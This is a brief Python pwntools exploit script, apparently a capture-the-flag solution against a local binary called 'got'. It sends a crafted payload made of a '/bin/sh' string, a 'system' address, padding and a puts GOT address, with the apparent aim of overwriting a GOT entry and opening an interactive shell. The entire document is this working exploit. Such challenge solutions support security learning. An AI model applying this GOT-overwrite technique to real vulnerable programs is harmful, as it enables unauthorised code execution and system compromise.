#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

p = process('./got')

puts_off = p64(0x601010)
system = p64(0x40074b)
bin_sh = '/bin/sh\x00'

p.recvuntil(':')
p.send(bin_sh + system + 'A' * 8 + puts_off)
p.interactive()
